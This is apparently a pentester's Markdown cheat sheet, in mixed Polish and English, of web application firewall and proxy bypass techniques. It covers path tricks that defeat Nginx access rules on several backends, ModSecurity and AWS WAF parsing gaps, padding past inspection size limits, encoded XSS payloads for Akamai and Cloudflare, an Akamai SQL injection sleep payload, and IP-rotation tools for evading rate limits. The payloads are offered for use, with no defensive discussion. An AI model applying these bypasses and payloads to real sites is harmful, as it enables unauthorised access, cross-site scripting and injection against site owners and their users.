# WAF / Proxy Bypass Techniques

## Nginx ACL Bypass

- **Node.js**: `\xA0` za ścieżką
- **Flask**: `\x85` za ścieżką
- **Spring Boot**: `;` za ścieżką
- **PHP-FPM**: `/admin.php/index.php` gdy `/admin.php` blocked

## ModSecurity v3

`%3f` w path decoded przez ModSec kończy path, backend dostaje `%3f` literalnie → inject payloads po `%3f`

## AWS WAF

- Tab-continuation (`\t`) w header value → AWS nie parsuje, backend tak
- **Size limits**: AWS WAF inspects only 8KB (ALB) / 64KB (CloudFront); Azure ≤128KB; Akamai 8KB default
- **Padding**: nowafpls Burp plugin — pad junk data przed payloadem

## Akamai

- Unicode normalization (10x decode): `<input/%2525252525252525253e/onfocus` → WAF sees closed tag, browser executes XSS
- SQLi bypass: `/*'or sleep(5)-- -*/`

## Cloudflare

- XSS: `<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;...">`
- CDN PoP-sharded rate limit countery → routuj przez różne geo egress

## IP Rotation

- **FireProx** (AWS API Gateway) — rotating source IPs per request
- **Burp IP-Rotate plugin**
- **catspin**
